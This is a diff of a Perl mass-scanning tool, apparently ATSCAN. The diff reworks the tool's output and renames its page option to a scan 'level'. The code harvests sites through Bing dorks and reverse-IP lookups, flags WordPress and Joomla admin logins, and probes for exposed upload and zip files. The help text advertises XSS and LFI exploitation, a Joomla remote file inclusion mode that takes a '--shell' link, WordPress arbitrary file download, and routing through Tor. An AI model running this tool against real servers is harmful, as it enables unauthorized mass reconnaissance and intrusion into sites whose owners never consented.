   open (FILE, "servers.txt");
   while (my $Target = <FILE>) {
-    print color 'bold';
-    print "    [+] checking $Target\n";
-    print color RESET;
+	sleep(1);
 	  
     $s_results3 = $Target;
     my @scanlist3=&scan3($s_results3);
     sub scan3(){
       my @search3;
-      for($npages3=1;$npages3<=$mpages;$npages3+=1){
+      for($npages3=0;$npages3<=$mlevel;$npages3+=10){
         my $google3=("http://www.bing.com/search?q=ip%3A".$s_results3."&first=".$npages3."&cc=".$myrand);
         my $search3=$ua->get("$google3");
         $search3->as_string;
@@ -2400,10 +2881,43 @@ sub msites {
 			
             if($domain2 =~ /([^:]*:\/\/)?([^\/]+\.[^\/]+)/g) {
               $site = $2;
-            }			
-	        print color 'green';
-            print "    [+] http://$site\n";
-	        print color RESET;
+            }
+			if ((!defined $mwpsites) && (!defined $mjoomsites)) {
+		  	  print color 'bold yellow';
+			  print "[!] TARGET: ";
+	          print color RESET;
+
+	          print color 'green';
+              print "http://$site\n";
+	          print color RESET;
+			
+              my $URL = $site;
+              $request = HTTP::Request->new('GET', $URL);
+              $response = $ua->request($request);
+			  print color 'bold yellow';
+			  print "[!] INFO:   ";
+	          print color RESET;
+              if($response = RC_OK){
+                print "HTTP/1.1 200 OK  ";
+                use Socket;
+                my $URL=$site;	 
+                $URL =~ s/\/.*//s;
+                $ip = gethostbyname($URL);
+				if ($ip) {
+                  printf "%s", "IP: ".inet_ntoa($ip);
+                  undef $ip;
+                  print "\n";
+				}else{
+                  print "\n";
+				}  
+              }  
+	          if (defined $mhttpd) {
+                $Target=$site;	 
+                $Target =~ s/\/.*//s;
+		        mhttpd();
+              }
+		  	  print "[ ]............................................................................ \n";
+			}  
 
             open (TEXT, '>>Server_sites_Scan.txt');
             print TEXT "http://$site\n";
@@ -2448,22 +2962,23 @@ sub msites {
     open my $file, "<", "Server_sites_Scan.txt";
     $lc++ while <$file>;
 	print color 'yellow';
-	print "    [!] $lc Unique Result(s) Found!\n";
-	print color RESET;
-	close $file;
-	  
-	print color 'yellow';
-    print "    [!] Results saved in $Bin Server_sites_Scan.txt! \n";
-	print color RESET;
 	
+	if ((!defined $mwpsites) && (!defined $mjoomsites)) {
+	  print "[!] $lc Unique Result(s) Found!\n";
+	  print color RESET;
+	  close $file;
+	  
+	  print color 'yellow';
+      print "[!] Results saved in $Bin/Server_sites_Scan.txt! \n";
+	  print color RESET;
+	}
   }else{ 
     print color 'red';
-    print "    [!] No Sites Found in the server! Try changing number of results to scan!\n";
+    print "[!] No Sites Found in the server! Try changing scan level!\n";
 	print color RESET;
   }
 	
   if ((defined $mjoomsites) || (defined $mwpsites) || (defined $muploadsites) || (defined $mzipsites) || (defined $madmin) || (defined $msubdomain)) {
-    pro();
   }else{
     print color 'red';
 	timer();
@@ -2475,47 +2990,67 @@ sub msites {
 ###################################################################		
 sub mwpsites {
   submsites();
+  infocounservertargets();
+
   $listcheck = "WP_server_sites_Scan.txt";
   if (-e $listcheck){ unlink 'WP_server_sites_Scan.txt'};
-  print color 'yellow';
-  print "    [+] Scaning Results Please wait....\n";
-  print color RESET;
   sleep(1);
   $listcheck2 = "Server_sites_Scan.txt";
   if (!-e $listcheck2){
 	sleep(1);
 	print color 'red';
-	print "    [+] Please make a scan to get the server sites First!!\n";
+	print "[+] Please make a scan to get the server sites First!!\n";
 	print color RESET;
     exit;
   }
-    
-  my $lc = 0;
-  my $file = "Server_sites_Scan.txt";
-  open my $file, "<", "Server_sites_Scan.txt";
-  $lc++ while <$file>;
-  print color 'yellow';
-  print "    [!] $lc Site(s) to Scan..\n";
-  print color RESET;
-  close $file;
   open (TEXT, "Server_sites_Scan.txt");
   while (my $site2 = <TEXT>) {
 	chomp $site2;
-    print "    [+] Checking $site2\n";
+	
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+    print "$site2 \n";
+			
+    my $URL1 = $site2;
+    $request = HTTP::Request->new('GET', $URL1);
+    $response = $ua->request($request);
+    print color 'bold yellow';
+	print "[!] INFO:   ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }  
+
 	$query = "/wp-login.php";
     my $URL = $site2.$query;
     $request = HTTP::Request->new('GET', $URL);
     $response = $ua->request($request);
     my $html = $response->content;
+	
+    print color 'bold yellow';
+	print "[!] VULN:   ";
+	print color RESET;
+		
 	if ( $html =~ m/loginform/i || m/user_login/i || m/username/i || m/email/i || m/Password/i || m/cPanel/i || m/admin/i || m/user_pass/i ){
 	  print color 'green';
-      print "    [!] $site2\n";
+      print "$site2 \n";
 	  print color RESET;
+	  
+	  
       open (LOG, '>>WP_server_sites_Scan.txt');
       print LOG "$site2\n";
 	  close (LOG);
-    }
+	  
+	}else{
+	  print color 'red';
+      print "No \n";
+	  print color RESET;
+	}
+    print "[ ]............................................................................ \n";
   }
+  
   $list = "WP_server_sites_Scan.txt";
   if (-e $list){
 	print "\n";	
@@ -2537,16 +3072,16 @@ sub mwpsites {
     open my $file, "<", "WP_server_sites_Scan.txt";
     $lc++ while <$file>;
 	print color 'yellow';
-	print "    [!] $lc Unique Result(s) Found!\n";
+	print "[!] $lc Unique Result(s) Found!\n";
 	print color RESET;
 	close $file;
 	  
 	print color 'yellow';
-    print "    [!] Results saved in $Bin WP_server_sites_Scan.txt! \n";
+    print "[!] Results saved in $Bin/WP_server_sites_Scan.txt! \n";
 	print color RESET;
   }else{ 
     print color 'red';
-    print "    [!] No Wordpress Sites Found!\n";
+    print "[!] No Wordpress Sites Found!\n";
 	print color RESET;
   }
   print color 'red';
@@ -2558,48 +3093,66 @@ sub mwpsites {
 ###################################################################		
 sub mjoomsites {
   submsites();
+  infocounservertargets();
+
   $listcheck = "Joom_server_sites_Scan.txt";
   if (-e $listcheck){ unlink 'Joom_server_sites_Scan.txt'};
-  print color 'yellow';
-  print "    [+] Scaning Results Please wait....\n";
-  print color RESET;
   sleep(1);
   $listcheck2 = "Server_sites_Scan.txt";
   if (!-e $listcheck2){
 	sleep(1);
 	print color 'red';
-	print "    [+] Please make a scan to get the server sites First!!\n";
+	print "[+] Please make a scan to get the server sites First!!\n";
 	print color RESET;
     exit;
   }
-	
-  my $lc = 0;
-  my $file = "Server_sites_Scan.txt";
-  open my $file, "<", "Server_sites_Scan.txt";
-  $lc++ while <$file>;
-  print color 'yellow';
-  print "    [!] $lc Site(s) to Scan..\n";
-  print color RESET;
-  close $file;
   open (TEXT, "Server_sites_Scan.txt");
   while (my $site2 = <TEXT>) {
 	chomp $site2;
-    print "    [+] Checking $site2\n";
-	  
+	
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+    print "$site2 \n";
+			
+    my $URL1 = $site2;
+    $request = HTTP::Request->new('GET', $URL1);
+    $response = $ua->request($request);
+    print color 'bold yellow';
+	print "[!] INFO:   ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }  
+
 	$query = "/administrator/index.php";
     my $URL = $site2.$query;
     $request = HTTP::Request->new('GET', $URL);
     $response = $ua->request($request);
     my $html = $response->content;
+	
+    print color 'bold yellow';
+	print "[!] VULN:   ";
+	print color RESET;
+		
 	if ( $html =~ m/mod-login-password/i || m/username/i || m/passwd/i || m/submit/i ){
 	  print color 'green';
-      print "    [!] $site2\n";
+      print "$site2 \n";
 	  print color RESET;
+	  
       open (LOG, '>>Joom_server_sites_Scan.txt');
       print LOG "$site2\n";
 	  close (LOG);
-    }
+	  
+	}else{
+	  print color 'red';
+      print "No \n";
+	  print color RESET;
+	}
+    print "[ ]............................................................................ \n";
   }
+  
   $list = "Joom_server_sites_Scan.txt";
   if (-e $list){
 	print "\n";	
@@ -2621,16 +3174,16 @@ sub mjoomsites {
     open my $file, "<", "Joom_server_sites_Scan.txt";
     $lc++ while <$file>;
 	print color 'yellow';
-	print "    [!] $lc Unique Result(s) Found!\n";
+	print "[!] $lc Unique Result(s) Found!\n";
 	print color RESET;
 	close $file;
 	  
 	print color 'yellow';
-    print "    [!] Results saved in $Bin Joom_server_sites_Scan.txt! \n";
+    print "[!] Results saved in $Bin/Joom_server_sites_Scan.txt! \n";
 	print color RESET;
   }else{ 
-     print color 'red';
-    print "    [!] No Joomla Sites Found!\n";
+    print color 'red';
+    print "[!] No Joomla Sites Found!\n";
 	print color RESET;
   }
   print color 'red';
@@ -2639,52 +3192,69 @@ sub mjoomsites {
   print color RESET;
 }  
 
-###################################################################
+###################################################################		
 sub muploadsites {
   submsites();
+  infocounservertargets();
+
   $listcheck = "Upload_server_files_Scan.txt";
   if (-e $listcheck){ unlink 'Upload_server_files_Scan.txt'};
-  print color 'yellow';
-  print "    [+] Scaning Results Please wait....\n";
-  print color RESET;
   sleep(1);
   $listcheck2 = "Server_sites_Scan.txt";
   if (!-e $listcheck2){
 	sleep(1);
 	print color 'red';
-	print "    [+] Please make a scan to get the server sites First!!\n";
+	print "[+] Please make a scan to get the server sites First!!\n";
 	print color RESET;
     exit;
   }
-	
-  my $lc = 0;
-  my $file = "Server_sites_Scan.txt";
-  open my $file, "<", "Server_sites_Scan.txt";
-  $lc++ while <$file>;
-  print color 'yellow';
-  print "    [!] $lc Site(s) to Scan..\n";
-  print color RESET;
-  close $file;
   open (TEXT, "Server_sites_Scan.txt");
   while (my $site2 = <TEXT>) {
 	chomp $site2;
-    print "    [+] Checking $site2\n";
-	  
+	
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+    print "$site2 \n";
+			
+    my $URL1 = $site2;
+    $request = HTTP::Request->new('GET', $URL1);
+    $response = $ua->request($request);
+    print color 'bold yellow';
+	print "[!] INFO:   ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }  
+
     foreach $UPLOAD(@UPLOAD){
       my $URL = $site2.$UPLOAD;
       $request = HTTP::Request->new('GET', $URL);
       $response = $ua->request($request);
       my $html = $response->content;
-      if ( $response->is_success ) {
-		print color 'green';
-        print "    [!] $site2\n";
-		print color RESET;
+	
+      print color 'bold yellow';
+	  print "[!] VULN:   ";
+	  print color RESET;
+		
+	  if ( $response->is_success ) {
+	    print color 'green';
+        print "$URL \n";
+	    print color RESET;
+	  
         open (LOG, '>>Upload_server_files_Scan.txt');
-        print LOG "$site2\n";
-		close (LOG);
-      }
-    }
+        print LOG "$URL\n";
+	    close (LOG);
+	  }else{
+	    print color 'red';
+        print "No \n";
+	    print color RESET;
+	  }
+      print "[ ]............................................................................ \n";
+	}
   }
+  
   $list = "Upload_server_files_Scan.txt";
   if (-e $list){
 	print "\n";	
@@ -2706,16 +3276,16 @@ sub muploadsites {
     open my $file, "<", "Upload_server_files_Scan.txt";
     $lc++ while <$file>;
 	print color 'yellow';
-	print "    [!] $lc Unique Result(s) Found!\n";
+	print "[!] $lc Unique Result(s) Found!\n";
 	print color RESET;
 	close $file;
 	  
 	print color 'yellow';
-    print "    [!] Results saved in $Bin Upload_server_files_Scan.txt! \n";
+    print "[!] Results saved in $Bin/Upload_server_files_Scan.txtt! \n";
 	print color RESET;
   }else{ 
     print color 'red';
-    print "    [!] No Upload Sites Found!\n";
+    print "[!] No Upload files Found!\n";
 	print color RESET;
   }
   print color 'red';
@@ -2727,54 +3297,71 @@ sub muploadsites {
 ###################################################################		
 sub mzipsites {
   submsites();
+  infocounservertargets();
+
   $listcheck = "Zip_server_files_Scan.txt";
   if (-e $listcheck){ unlink 'Zip_server_files_Scan.txt'};
-  print color 'yellow';
-  print "    [+] Scaning Results Please wait....\n";
-  print color RESET;
   sleep(1);
   $listcheck2 = "Server_sites_Scan.txt";
   if (!-e $listcheck2){
-    sleep(1);
+	sleep(1);
 	print color 'red';
-	print "    [+] Please make a scan to get the server sites First!!\n";
+	print "[+] Please make a scan to get the server sites First!!\n";
 	print color RESET;
     exit;
   }
-	
-  my $lc = 0;
-  my $file = "Server_sites_Scan.txt";
-  open my $file, "<", "Server_sites_Scan.txt";
-  $lc++ while <$file>;
-  print color 'yellow';
-  print "    [!] $lc Site(s) to Scan..\n";
-  print color RESET;
-  close $file;
   open (TEXT, "Server_sites_Scan.txt");
   while (my $site2 = <TEXT>) {
-    chomp $site2;
-    print "    [+] Checking $site2\n";
-	  
+	chomp $site2;
+	
+	print color 'bold yellow';
+	print "[!] TARGET: ";
+	print color RESET;
+    print "$site2 \n";
+			
+    my $URL1 = $site2;
+    $request = HTTP::Request->new('GET', $URL1);
+    $response = $ua->request($request);
+    print color 'bold yellow';
+	print "[!] INFO:   ";
+    print color RESET;
+    if($response = RC_OK){
+      print "HTTP/1.1 200 OK  ";
+      print "\n";
+    }  
+
     foreach $ZIP(@ZIP){
-      my $URL = $site2.$UPLOAD;
+      my $URL = $site2.$ZIP;
       $request = HTTP::Request->new('GET', $URL);
       $response = $ua->request($request);
       my $html = $response->content;
-      if ( $response->is_success ) {
-		print color 'green';
-        print "    [!] $site2\n";
-		print color RESET;
+	
+      print color 'bold yellow';
+	  print "[!] VULN:   ";
+	  print color RESET;
+		
+	  if ( $response->is_success ) {
+	    print color 'green';
+        print "$URL \n";
+	    print color RESET;
+	  
         open (LOG, '>>Zip_server_files_Scan.txt');
-        print LOG "$site2\n";
-		close (LOG);
-      }
-    }
+        print LOG "$URL\n";
+	    close (LOG);
+	  }else{
+	    print color 'red';
+        print "No \n";
+	    print color RESET;
+	  }
+      print "[ ]............................................................................ \n";
+	}
   }
+  
   $list = "Zip_server_files_Scan.txt";
   if (-e $list){
 	print "\n";	
 	my $lc = 0;
-	my $file = "Zip_server_files_Scan.txt'";
+	my $file = "Zip_server_files_Scan.txt";
     my %seen = ();
     {
       local @ARGV = ($file);
@@ -2791,16 +3378,16 @@ sub mzipsites {
     open my $file, "<", "Zip_server_files_Scan.txt";
     $lc++ while <$file>;
 	print color 'yellow';
-	print "    [!] $lc Unique Result(s) Found!\n";
+	print "[!] $lc Unique Result(s) Found!\n";
 	print color RESET;
 	close $file;
 	  
 	print color 'yellow';
-    print "    [!] Results saved in $Bin Zip_server_files_Scan.txt! \n";
+    print "[!] Results saved in $Bin/Zip_server_files_Scan.txtt! \n";
 	print color RESET;
   }else{ 
     print color 'red';
-    print "    [!] No Zip Files Found in those Server Sites!\n";
+    print "[!] No Upload files Found!\n";
 	print color RESET;
   }
   print color 'red';
@@ -2814,7 +3401,7 @@ sub mmd5 {
   $string = $string;
   sleep (1);
   print color 'green';
-  print "    [+] MD5 => ";
+  print "[+] MD5 => ";
   print Digest::MD5->md5_hex("$md");
   print "\n";
   print color RESET;
@@ -2826,7 +3413,7 @@ sub mencode64 {
   sleep (1);
   $sss=encode_base64($string);
   print color 'green';
-  print "    [!] Base64 encoded => $sss\n";
+  print "[!] Base64 encoded => $sss\n";
   print color RESET;
 }
 
@@ -2836,7 +3423,7 @@ sub mdecode64 {
   sleep (1);
   $rrr=decode_base64($string);
   print color 'green';
-  print "    [!] Base64 decoded => $rrr \n";
+  print "[!] Base64 decoded => $rrr \n";
   print color RESET;
 }
 
@@ -2845,7 +3432,7 @@ sub mcommand {
   if (defined $dork) {
     submsearch();
     $listname="Search_Scan.txt";
-    countargets();
+    infocountargets();
 	scandetail();
     forwait();
     open (TEXT, $listname);
@@ -2853,8 +3440,8 @@ sub mcommand {
       chomp $Target;
       if($Target !~ /http:\/\//) { $Target = "http://$Target"; };
       print color 'yellow'; 
-      print "\n    [+] $Target";
-      print "\n    ===========================================\n";
+      print "\n[+] $Target";
+      print "\n===========================================\n";
       print color RESET;
 	  my $command = $command.' '.$Target;
 	  print "$command \n";
@@ -2878,7 +3465,7 @@ sub mcommandfin {
 ###################################################################		
 sub help {
   print color 'bold yellow';
-  print "    [..] SIMPLE USE: \n\n";
+  print "[..] SIMPLE USE: \n\n";
   print color RESET;
   print color 'bold';
   print "       SEARCH ENGINE (BING) \n";
@@ -2919,12 +3506,12 @@ sub help {
   print color RESET;
   print "        - Execute commands \n\n";
   print color 'bold yellow';
-  print "    [..] COMMANDLINE USE: \n\n";
+  print "[..] COMMANDLINE USE: \n\n";
   print color RESET;
   print "     --tor:      | tor proxy [DEFAULT:socks://localhost:9050] Change if needed!\n";
   print "     --help:     | help menu \n";
   print "     -dork:      | dork to search [Ex: house,cars,hotel] \n";
-  print "     --mp:       | number of page results \n";
+  print "     --level:    | Scan level (when the scan must stop) \n";
   print "     --xss:      | xss scan \n";
   print "     -t:         | target \n";
   print "     -l:         | list \n";
@@ -2958,7 +3545,7 @@ sub help {
   print "     --isup:     | check http status 200. \n";
   print "     --httpd:    | print site httpd version \n\n";
   print color 'bold yellow';
-  print "    [..] EXAMPLES: \n\n";
+  print "[..] EXAMPLES: \n\n";
   print color RESET;
   print color 'bold';
   print "     Tor:   ";
@@ -2967,22 +3554,22 @@ sub help {
   print color 'bold';
   print "     Search engine: \n";
   print color RESET;
-  print "       Simple search: [--dork <dork> --mp <number of page results to scan>] \n";
-  print "                      [--dork <dork1,dork2,dork3> --mp <number of page results to scan>] \n";
-  print "                      [--dork <dorks.txt> --mp <number of page results to scan>] \n";
+  print "       Simple search: [--dork <dork> --level <level of page results to scan>] \n";
+  print "                      [--dork <dork1,dork2,dork3> --level <level of page results to scan>] \n";
+  print "                      [--dork <dorks.txt> --level <level of page results to scan>] \n";
   print color 'bold';
   print "     Subscan from Serach Engine: \n";
   print color RESET;
-  print "       Xss: --dork <dork/dork.txt> --mp <1> --xss \n";
-  print "       Lfi: --dork <dork/dork.txt> --mp <1> --lfi \n";
-  print "       Search + Command: --dork <dork/dork.txt> --mp <value> --command 'curl -v' --TARGET \n";
+  print "       Xss: --dork <dork/dork.txt> --level <1> --xss \n";
+  print "       Lfi: --dork <dork/dork.txt> --level <1> --lfi \n";
+  print "       Search + Command: --dork <dork/dork.txt> --level <value> --command 'curl -v' --TARGET \n";
   print color 'bold';
   print "     Validation: \n";
   print color RESET;
-  print "       Xss: --dork <dork/dork.txt> --mp <1> --xss --valid <txt>\n";
-  print "       Lfi: --dork <dork/dork.txt> --mp <1> --lfi --valid <txt> \n";
-  print "       Xss: --dork <dork/dork.txt> --mp <1> --xss --isup\n";
-  print "       Lfi: --dork <dork/dork.txt> --mp <1> --lfi --isup \n";
+  print "       Xss: --dork <dork/dork.txt> --level <1> --xss --valid <txt>\n";
+  print "       Lfi: --dork <dork/dork.txt> --level <1> --lfi --valid <txt> \n";
+  print "       Xss: --dork <dork/dork.txt> --level <1> --xss --isup\n";
+  print "       Lfi: --dork <dork/dork.txt> --level <1> --lfi --isup \n";
   print color 'bold';
   print "     Use List / Target: \n";
   print color RESET;
@@ -2997,13 +3584,13 @@ sub help {
   print color 'bold';
   print "     Server: \n";
   print color RESET;
-  print "       Get Server sites: -t <ip> --mp <value> --sites\n";
-  print "       Get Server wordpress sites: -t <ip> --mp <value> --wp \n";
-  print "       Get Server joomla sites: -t <ip> --mp <value> --joom \n";
-  print "       Get Server upload sites: -t <ip> --mp <value> --upload \n";
-  print "       Get Server zip sites files: -t <ip> --mp <value> --zip \n";
-  print "       WP Arbitry File Download: -t <ip> --mp <value> --wpadf \n";
-  print "       Joomla RFI: -t <ip> --mp <1> --joomfri --shell <shell link>\n";
+  print "       Get Server sites: -t <ip> --level <value> --sites\n";
+  print "       Get Server wordpress sites: -t <ip> --level <value> --wp \n";
+  print "       Get Server joomla sites: -t <ip> --level <value> --joom \n";
+  print "       Get Server upload sites: -t <ip> --level <value> --upload \n";
+  print "       Get Server zip sites files: -t <ip> --level <value> --zip \n";
+  print "       WP Arbitry File Download: -t <ip> --level <value> --wpadf \n";
+  print "       Joomla RFI: -t <ip> --level <1> --joomfri --shell <shell link>\n";
   print "       Scan basic tcp (quick): -t <ip> --ports --basic --tcp\n";
   print "       Scan basic udp basic (quick): -t <ip> --ports --basic --udp\n";
   print "       Scan basic udp+tcp: -t <ip> --ports --basic --udp --tcp\n";
@@ -3038,16 +3625,16 @@ if (defined $help) {help(); exit();}
 if ((defined $dork) && (defined $exploit)) {
   if ((!defined $misup) && (!defined $validation_text)){
       print color 'yellow';
-      print "    [!] You have to set Validation Mode! [--isup / --valid <txt>]\n";
+      print "[!] You have to set Validation Mode! [--isup / --valid <txt>]\n";
       print color RESET;
 	  exit();
   }
 }
 if (defined $dork) {
   $listname = "Search_Scan.txt";
-  if (!defined $mpages) {
+  if (!defined $mlevel) {
     print color 'yellow';
-    print "    [!] You have to set number of page results to scan!! [Ex: --mp 2]\n";
+    print "[!] You have to set level of page results to scan!! [Ex: --level 2]\n";
     print color 'RESET';
 	exit();
   }
@@ -3055,6 +3642,12 @@ if (defined $dork) {
    
 if (defined $dork) {
   if (defined $mxss) {
+    if ((!defined $exploit) && ((defined $misup) || (defined $validation_text))) {
+      print color 'yellow';
+      print "[!] You can not validate without exploit ! [Ex: --exp <exploit>]\n";
+      print color 'RESET';
+	  exit();
+    }
     submsearch();
     if (defined $sqlmap) {
       if (defined $proxy) {
@@ -3085,7 +3678,7 @@ if (defined $dork) {
   if ((defined $command) && (defined $dork)){
     if (!defined $mtarget) {
       print color 'yellow';
-      print "    [!] You have to set Target!! [Ex: --command <your command> --TARGET]\n";
+      print "[!] You have to set Target!! [Ex: --command <your command> --TARGET]\n";
       print color 'RESET';
 	  exit();
     }
@@ -3105,7 +3698,7 @@ if ((defined $command) && ((!defined $dork) && (!defined $mtarget))){
 if (defined $mxss) {
   if ((!defined $listname) && (!defined $Target)){
     print color 'yellow';
-    print "    [!] You have to set Target/list! [Ex: -l list.txt/ -t target]\n";
+    print "[!] You have to set Target/list! [Ex: -l list.txt/ -t target]\n";
     print color 'RESET';
 	exit();
   }  
@@ -3130,7 +3723,13 @@ if (defined $mxss) {
   
   if (defined $Target) {
     if (defined $sqlmap) {
-      if (defined $proxy) {
+      if ((!defined $exploit) && (!defined $validation_text)) {
+        print color 'yellow';
+        print "[!] You have to set Vlidation! [Ex: --valid <TXT>/ --isup]\n";
+        print color 'RESET';
+	    exit();
+	  }
+       if (defined $proxy) {
         if ((!defined $exploit) && (!defined $validation_text)) { mtXss(); sqlmaptor(); exit();}
         if ((defined $exploit) && (!defined $validation_text)) { mtexplXss(); sqlmaptor(); exit();}
         if ((defined $exploit) && (defined $validation_text)) { mtexplVaXss(); sqlmaptor(); exit(); }
@@ -3146,11 +3745,11 @@ if (defined $mxss) {
 	}
   }
 }  
- 
+
 if (defined $mlfi) {
   if ((!defined $listname) && (!defined $Target)) {
     print color 'yellow';
-    print "    [!] You have to set Target/list! [Ex: -l list.txt/ -t target]\n";
+    print "[!] You have to set Target/list! [Ex: -l list.txt/ -t target]\n";
     print color 'RESET';
 	exit();
   }
@@ -3161,7 +3760,7 @@ if (defined $mlfi) {
 if (defined $mjoomrfi) {
   if ((!defined $listname) && (!defined $Target) && (!defined $shell)) {
     print color 'yellow';
-    print "    [!] You have to set Target/list + shell! [Ex: -l list.txt/-t target --shell]\n";
+    print "[!] You have to set Target/list + shell! [Ex: -l list.txt/-t target --shell]\n";
     print color 'RESET';
 	exit();
   }
@@ -3172,7 +3771,7 @@ if (defined $mjoomrfi) {
 if (defined $mwpadf) {
   if ((!defined $listname) || (!defined $Target)) {
     print color 'yellow';
-    print "    [!] You have to set Target/list! [Ex: -l list.txt/-t target]\n";
+    print "[!] You have to set Target/list! [Ex: -l list.txt/-t target]\n";
     print color 'RESET';
 	exit();
   }
@@ -3183,7 +3782,7 @@ if (defined $mwpadf) {
 if (defined $madmin) {
   if ((!defined $listname) && (!defined $Target)) {
     print color 'yellow';
-    print "    [!] You have to set Target/list! [Ex: -l list.txt/-t target]\n";
+    print "[!] You have to set Target/list! [Ex: -l list.txt/-t target]\n";
     print color 'RESET';
 	exit();
   }
@@ -3194,7 +3793,7 @@ if (defined $madmin) {
 if (defined $msubdomain) {
   if ((!defined $listname) && (!defined $Target)) {
     print color 'yellow';
-    print "    [!] You have to set Target/list! [Ex: -l list.txt/-t target]\n";
+    print "[!] You have to set Target/list! [Ex: -l list.txt/-t target]\n";
     print color 'RESET';
 	exit();
   }
@@ -3205,7 +3804,7 @@ if (defined $msubdomain) {
 if (defined $mip) {
   if (!defined $host) {
     print color 'yellow';
-    print "    [!] You have to set a server ip! [Ex: -h 16.12.01.82]\n";
+    print "[!] You have to set a server ip! [Ex: -h 16.12.01.82]\n";
     print color 'RESET';
 	exit();
   }
@@ -3216,14 +3815,14 @@ if (defined $mip) {
 if (defined $mports) {
   if (!defined $Target) {
     print color 'yellow';
-    print "    [!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
+    print "[!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
     print color 'RESET';
 	exit();
   }
   if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
     if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
       print color 'red';
-      print "    [!] The given IP is not valid!\n";
+      print "[!] The given IP is not valid!\n";
       print color RESET;
 	  exit();
 	}
@@ -3232,7 +3831,7 @@ if (defined $mports) {
     if ((defined $mbasic) || (defined $mall) || (defined $muser)) {
 	  if ((!defined $mtcp) && (!defined $mudp)) {
         print color 'yellow';
-        print "    [!] Set a ports type! [Ex: --tcp / --udp / --tcp --udp ]\n";
+        print "[!] Set a ports type! [Ex: --tcp / --udp / --tcp --udp ]\n";
         print color 'RESET';
 	    exit();
 	  }
@@ -3240,7 +3839,7 @@ if (defined $mports) {
     if ((!defined $mbasic) && (!defined $mall)) {
 	  if ((defined $mstart) && (defined $mend) && (!defined $muser)){
         print color 'yellow';
-        print "    [!] Using Select Mode you must specify Scan Mode![--select]\n";
+        print "[!] Using Select Mode you must specify Scan Mode![--select]\n";
         print color 'RESET';
 	    exit();
 	  }
@@ -3248,7 +3847,7 @@ if (defined $mports) {
     if ((!defined $mbasic) && (!defined $mall) && (!defined $muser)) {
 	  if ((!defined $mstart) && (!defined $mend)){
         print color 'yellow';
-        print "    [!] Specify Scan Mode![Ex: --basic (quick)/ --all / --select]\n";
+        print "[!] Specify Scan Mode![Ex: --basic (quick)/ --all / --select]\n";
         print color 'RESET';
 	    exit();
 	  }	
@@ -3269,7 +3868,7 @@ if (defined $mports) {
     if (defined $muser) {
 	  if ((!defined $mstart) && (!defined $mend)) {
         print color 'yellow';
-        print "    [!] Set a port range! [Ex: --start 21 --end 81]\n";
+        print "[!] Set a port range! [Ex: --start 21 --end 81]\n";
         print color 'RESET';
 	    exit();
 	  }
@@ -3279,7 +3878,7 @@ if (defined $mports) {
 	}	
   }else{
     print color 'yellow';
-    print "    [!] You have to Set a Target!\n";
+    print "[!] You have to Set a Target!\n";
     print color 'RESET';
 	exit();
   }
@@ -3288,21 +3887,21 @@ if (defined $mports) {
 if (defined $msites) {
   if (!defined $Target) {
     print color 'yellow';
-    print "    [!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
+    print "[!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
     print color 'RESET';
 	exit();
   }
   if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
     if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
       print color 'red';
-      print "    [!] The given IP is not valid!\n";
+      print "[!] The given IP is not valid!\n";
       print color RESET;
 	  exit();
     }
   }
-  if (!defined $mpages) {
+  if (!defined $mlevel) {
     print color 'yellow';
-    print "    [!] You have to set number of page results to scan [Ex: --mp 1]\n";
+    print "[!] You have to set scan level (when scan must stop) [Ex: --level 50]\n";
     print color 'RESET';
 	exit();
   }
@@ -3312,21 +3911,21 @@ if (defined $msites) {
 if (defined $mwpsites) {
   if (!defined $Target){
     print color 'yellow';
-    print "    [!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
+    print "[!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
     print color 'RESET';
 	exit();
   }
   if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
     if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
       print color 'red';
-      print "    [!] The given IP is not valid!\n";
+      print "[!] The given IP is not valid!\n";
       print color RESET;
 	  exit();
     }
   }
-  if (!defined $mpages) {
+  if (!defined $mlevel) {
     print color 'yellow';
-    print "    [!] You have to set number of page results to scan [Ex: --mp 1]\n";
+    print "[!] You have to set scan level (when scan must stop) [Ex: --level 50]\n";
     print color 'RESET';
 	exit();
   }
@@ -3336,21 +3935,21 @@ if (defined $mwpsites) {
 if (defined $mjoomsites) {
   if (!defined $Target) {
     print color 'yellow';
-    print "    [!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
+    print "[!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
     print color 'RESET';
 	exit();
   }
   if (($Target !~ m/.txt/i) && ($Target !~ m/.log/i)){
     if ($Target!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
       print color 'red';
-      print "    [!] The given IP is not valid!\n";
+      print "[!] The given IP is not valid!\n";
       print color RESET;
 	  exit();
     }
   }
-  if (!defined $mpages) {
+  if (!defined $mlevel) {
     print color 'yellow';
-    print "    [!] You have to set number of page results to scan [Ex: --mp 1]\n";
+    print "[!] You have to set scan level (when scan must stop) [Ex: --level 50]\n";
     print color 'RESET';
 	exit();
   }
@@ -3360,21 +3959,21 @@ if (defined $mjoomsites) {
 if (defined $muplodsites) {
   if (!defined $Target) {
     print color 'yellow';
-    print "    [!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
+    print "[!] You have to set a server ip! [Ex: -t 16.12.01.82]\n";
     print color 'RESET';
 	exit();
